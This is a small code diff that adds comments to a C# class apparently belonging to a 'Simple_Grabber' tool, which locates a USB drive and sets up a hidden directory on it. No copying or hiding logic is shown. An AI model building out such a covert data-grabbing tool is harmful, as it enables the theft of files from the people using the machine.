@@ -6,6 +6,8 @@ namespace Simple_Grabber
 {
     public class Grabber
     {
+        // Get specified the USB path
+
         private static string USBPath()
         {
             // Get an array of all drives present on the system
@@ -26,6 +28,8 @@ namespace Simple_Grabber
 
             return drivePath;
         }
+
+        // Initialize the hidden directory on the USB
 
         private static void InitializeDirectory()
         {
